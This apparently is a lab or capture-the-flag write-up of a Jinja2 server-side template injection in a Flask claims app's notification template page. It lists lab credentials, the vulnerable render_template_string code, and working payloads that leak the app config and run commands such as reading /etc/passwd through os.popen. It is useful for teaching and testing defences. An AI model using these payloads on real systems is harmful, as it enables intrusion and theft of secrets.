# RCE 1 — SSTI through Jinja Template

---

## Vulnerability Summary

The OIC notification template customisation page (`/oic/customize-claim-notification`) allows OIC staff to edit a Jinja2 template string that is stored in PostgreSQL. When a claim is approved or updated, the stored template is rendered server-side using `render_template_string()`, which processes Jinja2 expressions. An attacker with OIC access can inject SSTI payloads into the template to execute arbitrary commands on the server.

### Vulnerable Code

**`app.py` — `/oic/customize-claim-notification` route (no sanitisation on save):**
```python
template.template_content = template_content  # stored raw, no sanitisation
```

**`app.py` — `_render_claim_notification()` (rendered with `render_template_string`):**
```python
rendered = render_template_string(
    template.template_content,   # ← attacker-controlled template
    claim_data=claim,
    claim_title=claim.title,
    claim_amount=claim.amount,
    claim_status=claim.status,
    submitter_name=claim.submitter.username,
    claim_id=claim.id
)
```

---

## Exploitation Steps

### Step 1 — Log in as the OIC user

```
Username: oic_admin
Password: oic_admin_pass
```

### Step 2 — Navigate to the template customisation page

Go to **Notification Template** (`/oic/customize-claim-notification`).

### Step 3 — Read the Flask secret key (information disclosure)

Replace the template content with:

```jinja2
{{ config }}
```

Then approve any claim. Check the application logs (stdout) — the rendered notification will contain the entire Flask configuration, including `SECRET_KEY` and `DATABASE_URL`.

### Step 4 — Achieve Remote Code Execution

Replace the template content with a payload that accesses Python's built-in `os` module through Jinja2's class hierarchy:

**List files on the server:**
```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

This dumps all Python subclasses. Find `os._wrap_close` or any class that gives access to `os.popen` or `subprocess`.

**Direct RCE using `lipsum` (a common Flask/Jinja2 bypass):**
```jinja2
{{ lipsum.__globals__['os'].popen('id').read() }}
```

**Execute a reverse shell or arbitrary command:**
```jinja2
{{ lipsum.__globals__['os'].popen('whoami && cat /etc/passwd').read() }}
```

### Step 5 — Trigger the payload

The SSTI payload executes whenever a claim is approved (or the notification is re-rendered). Approve any pending claim from the OIC dashboard. The server output will appear in the application logs:

```
Notification rendered for claim 1: uid=0(root) gid=0(root)...
```

---

## Available Jinja2 Variables in the Template

The following variables are passed to `render_template_string` and can be used in payloads:

| Variable          | Value                        |
|-------------------|------------------------------|
| `claim_data`      | The full Claim ORM object    |
| `claim_title`     | Claim title string           |
| `claim_amount`    | Claim amount (float)         |
| `claim_status`    | Claim status string          |
| `submitter_name`  | Submitter's username string  |
| `claim_id`        | Claim ID (integer)           |

